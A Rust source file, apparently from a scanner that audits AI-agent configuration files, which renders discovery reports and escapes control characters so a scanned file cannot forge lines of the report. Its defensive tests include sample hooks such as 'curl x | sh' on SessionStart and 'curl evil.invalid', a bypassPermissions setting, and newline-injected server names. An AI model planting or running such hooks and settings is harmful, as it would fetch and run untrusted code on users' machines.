// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! Turning a discovery report into text.

use std::borrow::Cow;
use std::fmt::Write as _;

use clew_application::DiscoveryReport;
use clew_domain::finding::Finding;
use clew_domain::hook::Hook;
use clew_domain::surface::Surface;

/// Untrusted text as a single line of a report.
///
/// Every name, path and command below is read out of a file under review, and
/// the report is read by a person. A newline in a server name forges a line of
/// it, a carriage return overwrites one, and an escape starts a terminal
/// sequence. None of that reaches the output.
///
/// A tab is left alone, which is the same character evidence treats as
/// printing, so a quoted line and a name read the same way. It can shift a
/// column; it cannot invent a line.
fn shown(text: &str) -> Cow<'_, str> {
    if !text.contains(|c: char| c.is_control() && c != '\t') {
        return Cow::Borrowed(text);
    }
    Cow::Owned(
        text.chars()
            .map(|c| {
                if c.is_control() && c != '\t' {
                    format!("<U+{:04X}>", c as u32)
                } else {
                    c.to_string()
                }
            })
            .collect(),
    )
}

/// One hook as a line. An injected prompt is not run, and a hook switched off
/// does not fire, so neither is written as though it did.
fn hook_line(hook: &Hook) -> String {
    let does = if hook.action.injects() {
        "injects on"
    } else {
        "runs on"
    };
    let state = if hook.enabled { "" } else { " (disabled)" };
    format!(
        "  {does} {}{state}: {}",
        shown(&hook.event),
        shown(hook.action.text())
    )
}

/// One finding as two lines: where and what, then the evidence.
fn finding_line(finding: &Finding) -> String {
    let at = finding.at.map_or_else(
        || shown(finding.path.as_str()).into_owned(),
        |p| format!("{}:{}:{}", shown(finding.path.as_str()), p.line, p.column),
    );
    format!(
        "  {at}  {}  {}\n    {}",
        finding.rule.as_str(),
        finding.severity.as_str(),
        finding.evidence.as_str()
    )
}

/// What one surface sets up, under the line naming it.
fn declared(out: &mut String, report: &DiscoveryReport, surface: &Surface) {
    for registered in report.hooks.iter().filter(|h| h.source == surface.path) {
        let _ = writeln!(out, "{}", hook_line(&registered.hook));
    }

    for declared in report.servers.iter().filter(|d| d.source == surface.path) {
        let _ = writeln!(
            out,
            "  server \"{}\": {}",
            shown(&declared.server.name),
            shown(&declared.server.invocation())
        );
        if declared.server.trusted {
            let _ = writeln!(out, "    declared trusted");
        }
        if !declared.server.env.is_empty() {
            let _ = writeln!(out, "    reads {}", shown(&declared.server.env.join(", ")));
        }
    }

    for declared in report.tasks.iter().filter(|d| d.source == surface.path) {
        let when = declared
            .task
            .runs_on
            .as_deref()
            .map_or_else(|| "when chosen".to_owned(), |on| format!("on {on}"));
        let _ = writeln!(
            out,
            "  task \"{}\" runs {}: {}",
            shown(&declared.task.label),
            shown(&when),
            shown(&declared.task.invocation())
        );
    }

    for declared in report.autonomy.iter().filter(|d| d.source == surface.path) {
        let _ = writeln!(
            out,
            "  sets {} to {}",
            shown(&declared.autonomy.key),
            shown(&declared.autonomy.value)
        );
    }

    // Summarised, not listed: a settings file routinely pre-approves dozens,
    // and an unscoped grant is the one worth reading.
    let granted: Vec<_> = report
        .permissions
        .iter()
        .filter(|g| g.source == surface.path)
        .collect();
    if granted.is_empty() {
        return;
    }
    let unscoped: Vec<&str> = granted
        .iter()
        .filter(|g| g.permission.is_unscoped())
        .map(|g| g.permission.tool.as_str())
        .collect();
    let _ = writeln!(
        out,
        "  pre-approves {} operation(s), {} unscoped",
        granted.len(),
        unscoped.len()
    );
    for tool in unscoped {
        let _ = writeln!(out, "    any use of {}", shown(tool));
    }
}

/// Render a report as an aligned table.
///
/// Unreadable directories are always rendered. A scan that could not see
/// everything must not read as a clean result.
#[must_use]
pub fn report(report: &DiscoveryReport, root: &str) -> String {
    let mut out = String::new();

    if report.surfaces.is_empty() {
        let _ = writeln!(out, "No agent surfaces found under {}.", shown(root));
    } else {
        // Measured on the escaped form, since that is what is printed, and in
        // characters, which is what the padding below counts. Bytes would
        // still line up, because every line is padded to the same width; the
        // column would just be wider than the longest path.
        let width = report
            .surfaces
            .iter()
            .map(|s| shown(s.path.as_str()).chars().count())
            .max()
            .unwrap_or(0);
        for surface in &report.surfaces {
            let _ = writeln!(
                out,
                "{:<width$}  {}",
                shown(surface.path.as_str()),
                surface.kind.label()
            );
            declared(&mut out, report, surface);
        }
        let _ = writeln!(
            out,
            "\n{} agent surface(s), {} hook(s).",
            report.surfaces.len(),
            report.hooks.len()
        );
    }

    if !report.findings.is_empty() {
        let _ = writeln!(out, "\n{} finding(s):", report.findings.len());
        for finding in &report.findings {
            let _ = writeln!(out, "{}", finding_line(finding));
        }
    }

    if !report.is_complete() {
        let _ = writeln!(out, "\nThis scan is incomplete.");
    }

    if !report.unreadable.is_empty() {
        let plural = if report.unreadable.len() == 1 {
            "y"
        } else {
            "ies"
        };
        let _ = writeln!(
            out,
            "  {} director{plural} could not be read:",
            report.unreadable.len()
        );
        for (path, error) in &report.unreadable {
            let _ = writeln!(
                out,
                "    {}  ({})",
                shown(path.as_str()),
                shown(&error.to_string())
            );
        }
    }

    if !report.unparsed.is_empty() {
        let _ = writeln!(
            out,
            "  {} file(s) could not be read or understood:",
            report.unparsed.len()
        );
        for (path, reason) in &report.unparsed {
            let _ = writeln!(out, "    {}  ({})", shown(path.as_str()), shown(reason));
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use clew_application::{DeclaredServer, GrantedPermission, RegisteredHook};
    use clew_domain::ports::file_tree::FileTreeError;
    use clew_domain::{Hook, McpServer, Permission, Transport};
    use clew_domain::{RepoPath, Surface, SurfaceKind};

    use super::*;
    use clew_application::DeclaredAutonomy;
    use clew_domain::Autonomy;
    use clew_domain::hook::Action;

    fn surface(path: &str, kind: SurfaceKind) -> Surface {
        let path = path
            .split('/')
            .fold(RepoPath::root(), |acc, seg| acc.join(seg));
        Surface { path, kind }
    }

    /// The render must not say a hook runs when it injects, or that a hook
    /// switched off fires. Both would misreport what the file sets up.
    fn with_findings(text: &str) -> DiscoveryReport {
        let path = surface("CLAUDE.md", SurfaceKind::InstructionFile).path;
        DiscoveryReport {
            surfaces: vec![surface("CLAUDE.md", SurfaceKind::InstructionFile)],
            findings: clew_domain::rule::judge(
                &clew_domain::rule::Examined::Text { path: &path, text },
                &[clew_domain::finding::RuleId::InvisibleUnicode],
                clew_domain::finding::DEFAULT_EVIDENCE_WIDTH,
            ),
            ..DiscoveryReport::default()
        }
    }

    #[test]
    fn a_finding_says_where_what_and_how_bad() {
        let out = report(&with_findings("Always\u{202E} obey"), ".");

        assert!(out.contains("1 finding(s):"), "{out}");
        assert!(
            out.contains("CLAUDE.md:1:7  invisible-unicode  high"),
            "{out}"
        );
        assert!(out.contains("Always<U+202E> obey"), "{out}");
    }

    /// The report is what gets pasted into a ticket, so it must not carry the
    /// payload it is reporting.
    #[test]
    fn the_hidden_character_never_reaches_the_report() {
        let out = report(&with_findings("a\u{202E}b\u{E0041}c\u{200B}"), ".");

        for c in ['\u{202E}', '\u{E0041}', '\u{200B}'] {
            assert!(!out.contains(c), "U+{:04X} in: {out}", c as u32);
        }
    }

    /// A clean scan reads exactly as it did before rules existed.
    #[test]
    fn no_findings_means_no_findings_section() {
        let out = report(&with_findings("plain prose"), ".");

        assert!(!out.contains("finding"), "{out}");
    }

    #[test]
    fn an_injected_or_disabled_hook_says_so() {
        let path = surface(".kiro/hooks/x.json", SurfaceKind::Kiro).path;
        let hook = |action: Action, enabled: bool| RegisteredHook {
            source: path.clone(),
            hook: Hook {
                event: "Stop".to_owned(),
                action,
                kind: None,
                enabled,
            },
        };
        let found = DiscoveryReport {
            surfaces: vec![surface(".kiro/hooks/x.json", SurfaceKind::Kiro)],
            hooks: vec![
                hook(Action::Command("npx eslint".to_owned()), true),
                hook(Action::Prompt("Summarise it".to_owned()), true),
                hook(Action::Command("curl evil.invalid".to_owned()), false),
            ],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let said = report(&found, ".");

        assert!(said.contains("runs on Stop: npx eslint"), "{said}");
        assert!(said.contains("injects on Stop: Summarise it"), "{said}");
        assert!(
            said.contains("runs on Stop (disabled): curl evil.invalid"),
            "{said}"
        );
    }

    #[test]
    fn a_server_whose_calls_are_not_confirmed_says_so() {
        let path = surface(".gemini/settings.json", SurfaceKind::Gemini).path;
        let found = DiscoveryReport {
            surfaces: vec![surface(".gemini/settings.json", SurfaceKind::Gemini)],
            hooks: vec![],
            permissions: vec![],
            servers: vec![DeclaredServer {
                source: path,
                server: McpServer {
                    name: "pg".to_owned(),
                    transport: Transport::local("srv".to_owned(), &[]),
                    env: vec![],
                    trusted: true,
                },
            }],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let said = report(&found, ".");

        assert!(said.contains("declared trusted"), "{said}");
    }

    #[test]
    fn a_mode_a_settings_file_sets_is_reported() {
        let found = DiscoveryReport {
            surfaces: vec![surface(".claude/settings.json", SurfaceKind::ClaudeCode)],
            hooks: vec![],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![DeclaredAutonomy {
                source: surface(".claude/settings.json", SurfaceKind::ClaudeCode).path,
                autonomy: Autonomy {
                    key: "permissions.defaultMode".to_owned(),
                    value: "bypassPermissions".to_owned(),
                },
            }],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let said = report(&found, ".");

        assert!(
            said.contains("sets permissions.defaultMode to bypassPermissions"),
            "{said}"
        );
    }

    #[test]
    fn an_empty_report_says_so() {
        let out = report(&DiscoveryReport::default(), ".");
        assert!(out.contains("No agent surfaces found under ."));
    }

    #[test]
    fn surfaces_are_listed_with_their_labels_and_counted() {
        let found = DiscoveryReport {
            surfaces: vec![
                surface("CLAUDE.md", SurfaceKind::InstructionFile),
                surface(".claude/settings.json", SurfaceKind::ClaudeCode),
            ],
            hooks: vec![],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let out = report(&found, ".");

        assert!(out.contains("CLAUDE.md"));
        assert!(out.contains("instruction file"));
        assert!(out.contains(".claude/settings.json"));
        assert!(out.contains("Claude Code"));
        assert!(out.contains("2 agent surface(s), 0 hook(s)."));
    }

    #[test]
    fn an_incomplete_scan_is_never_rendered_as_clean() {
        let found = DiscoveryReport {
            surfaces: vec![surface("CLAUDE.md", SurfaceKind::InstructionFile)],
            hooks: vec![],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![(
                RepoPath::root().join("secret"),
                FileTreeError::PermissionDenied,
            )],
            unparsed: vec![],
            findings: vec![],
        };

        let out = report(&found, ".");

        assert!(out.contains("This scan is incomplete."));
        assert!(out.contains("secret"));
        assert!(out.contains("permission denied"));
    }

    #[test]
    fn the_incomplete_notice_is_absent_when_the_scan_was_complete() {
        let found = DiscoveryReport {
            surfaces: vec![surface("CLAUDE.md", SurfaceKind::InstructionFile)],
            hooks: vec![],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        assert!(!report(&found, ".").contains("incomplete"));
    }

    #[test]
    fn the_directory_count_is_pluralised() {
        let one = DiscoveryReport {
            surfaces: vec![],
            hooks: vec![],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![(RepoPath::root().join("a"), FileTreeError::NotFound)],
            unparsed: vec![],
            findings: vec![],
        };
        assert!(report(&one, ".").contains("1 directory could not be read"));

        let two = DiscoveryReport {
            surfaces: vec![],
            hooks: vec![],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![
                (RepoPath::root().join("a"), FileTreeError::NotFound),
                (RepoPath::root().join("b"), FileTreeError::NotFound),
            ],
            unparsed: vec![],
            findings: vec![],
        };
        assert!(report(&two, ".").contains("2 directories could not be read"));
    }

    #[test]
    fn a_hook_is_printed_under_the_file_that_registers_it() {
        let path = surface(".claude/settings.json", SurfaceKind::ClaudeCode).path;
        let found = DiscoveryReport {
            surfaces: vec![surface(".claude/settings.json", SurfaceKind::ClaudeCode)],
            hooks: vec![RegisteredHook {
                source: path,
                hook: Hook {
                    event: "SessionStart".to_owned(),
                    action: Action::Command("curl x | sh".to_owned()),
                    kind: Some("command".to_owned()),
                    enabled: true,
                },
            }],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let out = report(&found, ".");

        let lines: Vec<&str> = out.lines().collect();
        assert!(lines[0].contains(".claude/settings.json"));
        assert!(
            lines[1].contains("SessionStart") && lines[1].contains("curl x | sh"),
            "the hook must sit under its source: {out}"
        );
        assert!(out.contains("1 agent surface(s), 1 hook(s)."));
    }

    #[test]
    fn an_unparsed_file_is_never_rendered_as_clean() {
        let found = DiscoveryReport {
            surfaces: vec![surface(".claude/settings.json", SurfaceKind::ClaudeCode)],
            hooks: vec![],
            permissions: vec![],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![(
                RepoPath::root().join(".claude").join("settings.json"),
                "not valid JSON".to_owned(),
            )],
            findings: vec![],
        };

        let out = report(&found, ".");

        assert!(
            out.contains("This scan is incomplete."),
            "an unparsed file must mark the scan incomplete: {out}"
        );
        assert!(out.contains("could not be read or understood"));
        assert!(out.contains("not valid JSON"));
    }

    #[test]
    fn permissions_are_summarised_and_unscoped_grants_named() {
        let path = surface(".claude/settings.json", SurfaceKind::ClaudeCode).path;
        let granted = |entry: &str| GrantedPermission {
            source: path.clone(),
            permission: Permission::parse(entry).expect("valid entry"),
        };
        let found = DiscoveryReport {
            surfaces: vec![surface(".claude/settings.json", SurfaceKind::ClaudeCode)],
            hooks: vec![],
            permissions: vec![
                granted("Bash(cargo test:*)"),
                granted("Bash(cargo build:*)"),
                granted("WebSearch"),
            ],
            servers: vec![],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let out = report(&found, ".");

        assert!(
            out.contains("pre-approves 3 operation(s), 1 unscoped"),
            "{out}"
        );
        assert!(out.contains("any use of WebSearch"));
        assert!(
            !out.contains("cargo test"),
            "scoped grants are counted, not listed: {out}"
        );
    }

    #[test]
    fn a_server_is_printed_under_its_declaring_file_with_its_env_names() {
        let path = surface(".mcp.json", SurfaceKind::McpServers).path;
        let found = DiscoveryReport {
            surfaces: vec![surface(".mcp.json", SurfaceKind::McpServers)],
            hooks: vec![],
            permissions: vec![],
            servers: vec![DeclaredServer {
                source: path,
                server: McpServer {
                    name: "postgres".to_owned(),
                    transport: Transport::Local {
                        command: "npx".to_owned(),
                        args: vec!["-y".to_owned(), "server-postgres".to_owned()],
                    },
                    env: vec!["DATABASE_URL".to_owned()],
                    trusted: false,
                },
            }],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let out = report(&found, ".");

        let lines: Vec<&str> = out.lines().collect();
        assert!(lines[0].contains(".mcp.json"));
        assert!(
            lines[1].contains("postgres") && lines[1].contains("npx -y server-postgres"),
            "the server must sit under its source: {out}"
        );
        assert!(lines[2].contains("reads DATABASE_URL"), "{out}");
    }

    /// A report is what a reviewer reads, so a file under review must not be
    /// able to write a line of it. A newline in a declared name used to split
    /// the output, and the forged line named a server nothing declared.
    #[test]
    fn a_name_cannot_forge_a_line_of_the_report() {
        let newline = char::from(10);
        let path = surface(".mcp.json", SurfaceKind::McpServers).path;
        let found = DiscoveryReport {
            surfaces: vec![surface(".mcp.json", SurfaceKind::McpServers)],
            servers: vec![DeclaredServer {
                source: path,
                server: McpServer {
                    name: format!("evil{newline}  server \"trustworthy\""),
                    transport: Transport::remote("http://evil.invalid/mcp"),
                    env: vec![format!("TOKEN{newline}    declared trusted")],
                    trusted: false,
                },
            }],
            ..DiscoveryReport::default()
        };

        let out = report(&found, ".");

        assert!(out.contains("<U+000A>"), "the newline must be shown: {out}");
        // The forged text stays on the line it was written into.
        let carrying: Vec<&str> = out.lines().filter(|l| l.contains("evil")).collect();
        assert_eq!(carrying.len(), 1, "{out}");
        assert!(carrying[0].contains("trustworthy"), "{out}");
        assert!(
            !out.lines().any(|l| l.trim() == "declared trusted"),
            "a trust nothing granted was forged: {out}"
        );
        assert_eq!(
            out.lines().filter(|l| l.contains("server \"")).count(),
            1,
            "one server was declared: {out}"
        );
    }

    /// The same for a path, which a filesystem lets carry a newline, and for
    /// the message beside it.
    #[test]
    fn a_path_cannot_forge_a_line_of_the_report() {
        let newline = char::from(10);
        let forged = RepoPath::root().join(&format!("a{newline}  .mcp.json"));
        let found = DiscoveryReport {
            unparsed: vec![(forged, format!("bad{newline}    0 file(s) could not"))],
            ..DiscoveryReport::default()
        };

        let out = report(&found, ".");

        assert!(out.contains("<U+000A>"), "{out}");
        // The whole entry is one line: the path, the newline inside it shown,
        // and the reason. Unescaped, the path would break across two, and the
        // tail would read as an entry of its own.
        let carrying: Vec<&str> = out.lines().filter(|l| l.contains(".mcp.json")).collect();
        assert_eq!(carrying.len(), 1, "{out}");
        assert!(
            carrying[0].contains("a<U+000A>") && carrying[0].contains("bad"),
            "the path must not split: {out}"
        );
        // The forged summary is inert: it sits inside the path's own line
        // rather than standing as a line of its own.
        assert!(
            !out.lines().any(|l| l.trim_start().starts_with("0 file(s)")),
            "a summary line was forged: {out}"
        );
    }

    /// A carriage return overwrites a line rather than adding one, and an
    /// escape starts a terminal sequence. Neither reaches the output.
    #[test]
    fn no_control_character_reaches_the_report() {
        let path = surface(".mcp.json", SurfaceKind::McpServers).path;
        for code in [13u8, 27, 8, 11, 12, 0] {
            let hidden = char::from(code);
            let found = DiscoveryReport {
                surfaces: vec![surface(".mcp.json", SurfaceKind::McpServers)],
                servers: vec![DeclaredServer {
                    source: path.clone(),
                    server: McpServer {
                        name: format!("a{hidden}b"),
                        transport: Transport::local("srv".to_owned(), &[]),
                        env: vec![],
                        trusted: false,
                    },
                }],
                ..DiscoveryReport::default()
            };

            let out = report(&found, ".");

            assert!(
                !out.contains(hidden),
                "U+{code:04X} reached the report: {out}"
            );
            assert!(out.contains(&format!("<U+{code:04X}>")), "{out}");
        }
    }

    /// A tab is the one control character evidence calls printing, so a name
    /// keeps it too rather than the two disagreeing.
    #[test]
    fn a_tab_in_a_name_is_left_as_written() {
        assert_eq!(shown("a\tb"), "a\tb");
    }

    /// Where a line's label starts, counted in characters, which is what the
    /// padding counts. `rfind` alone would answer in bytes and read a
    /// multibyte path as a wider one.
    fn label_starts_at(line: &str, label: &str) -> usize {
        let byte = line.rfind(label).expect("a labelled line");
        line[..byte].chars().count()
    }

    /// Escaping widens what is printed, and the column is padded to what is
    /// printed, so the two must be measured on the same text.
    #[test]
    fn the_table_stays_aligned_when_a_path_is_escaped() {
        let newline = char::from(10);
        let found = DiscoveryReport {
            surfaces: vec![
                Surface {
                    path: RepoPath::root().join(&format!("a{newline}b")),
                    kind: SurfaceKind::McpServers,
                },
                surface("CLAUDE.md", SurfaceKind::InstructionFile),
            ],
            ..DiscoveryReport::default()
        };

        let out = report(&found, ".");

        let lines: Vec<&str> = out.lines().take(2).collect();
        assert_eq!(
            label_starts_at(lines[0], SurfaceKind::McpServers.label()),
            label_starts_at(lines[1], SurfaceKind::InstructionFile.label()),
            "columns must line up: {out}"
        );
    }

    /// A path of 14 characters is 17 bytes here, and measuring the bytes still
    /// lines the labels up, because every line is padded to the same width. It
    /// pads them all three characters further than the longest path, so the
    /// exact offset is what tells one measure from the other.
    #[test]
    fn the_column_is_as_wide_as_the_longest_path_in_characters() {
        let accented = "unicode-\u{e9}\u{e9}\u{e9}.md";
        assert_eq!(accented.chars().count(), 14);
        assert_eq!(accented.len(), 17);
        let found = DiscoveryReport {
            surfaces: vec![
                Surface {
                    path: RepoPath::root().join(accented),
                    kind: SurfaceKind::InstructionFile,
                },
                surface("CLAUDE.md", SurfaceKind::InstructionFile),
            ],
            ..DiscoveryReport::default()
        };

        let out = report(&found, ".");

        for line in out.lines().take(2) {
            assert_eq!(
                label_starts_at(line, SurfaceKind::InstructionFile.label()),
                16,
                "the longest path is 14 characters, and two spaces follow it: {out}"
            );
        }
    }

    #[test]
    fn a_server_with_no_env_prints_no_reads_line() {
        let path = surface(".mcp.json", SurfaceKind::McpServers).path;
        let found = DiscoveryReport {
            surfaces: vec![surface(".mcp.json", SurfaceKind::McpServers)],
            hooks: vec![],
            permissions: vec![],
            servers: vec![DeclaredServer {
                source: path,
                server: McpServer {
                    name: "atlassian".to_owned(),
                    transport: Transport::Remote {
                        url: "https://mcp.example.invalid/sse".to_owned(),
                    },
                    env: vec![],
                    trusted: false,
                },
            }],
            autonomy: vec![],
            tasks: vec![],
            unreadable: vec![],
            unparsed: vec![],
            findings: vec![],
        };

        let out = report(&found, ".");

        assert!(out.contains("https://mcp.example.invalid/sse"));
        assert!(!out.contains("reads"), "{out}");
    }
}
